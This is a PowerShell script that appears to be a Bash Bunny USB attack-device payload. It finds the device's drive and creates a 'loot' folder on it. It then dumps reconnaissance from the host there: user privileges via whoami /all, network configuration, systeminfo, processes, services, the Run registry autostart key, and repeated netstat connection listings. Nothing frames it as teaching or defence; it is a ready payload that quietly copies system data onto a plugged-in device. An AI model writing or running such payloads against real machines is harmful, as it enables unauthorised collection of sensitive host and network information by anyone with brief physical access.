$BunnyDrive = (Get-Volume -FileSystemLabel 'BASHBUNNY' -ErrorAction SilentlyContinue).DriveLetter
if (-not $BunnyDrive) {
    $BunnyDrive = 'D'
}

$LootFolder = "$($BunnyDrive):\payloads\switch1\loot"
New-Item -ItemType Directory -Path $LootFolder -Force | Out-Null

$ReportFile = "$LootFolder\Loot_$($env:COMPUTERNAME)_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"

"=== SYSTEM INFORMATION ===" | Out-File -FilePath $ReportFile -Append
whoami /all | Out-File -FilePath $ReportFile -Append
ipconfig /all | Out-File -FilePath $ReportFile -Append
systeminfo | Out-File -FilePath $ReportFile -Append

"=== PROCESS / SERVICE / REGISTRY ===" | Out-File -FilePath $ReportFile -Append
Get-Process | Select-Object -First 15 | Out-File -FilePath $ReportFile -Append
Get-Service | Select-Object -First 15 | Out-File -FilePath $ReportFile -Append
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" | Out-File -FilePath $ReportFile -Append

for ($i = 0; $i -lt 25; $i++) {
    whoami | Out-File -FilePath $ReportFile -Append
    hostname | Out-File -FilePath $ReportFile -Append
    netstat -ano | Out-File -FilePath $ReportFile -Append
    Start-Sleep -Milliseconds 250
}
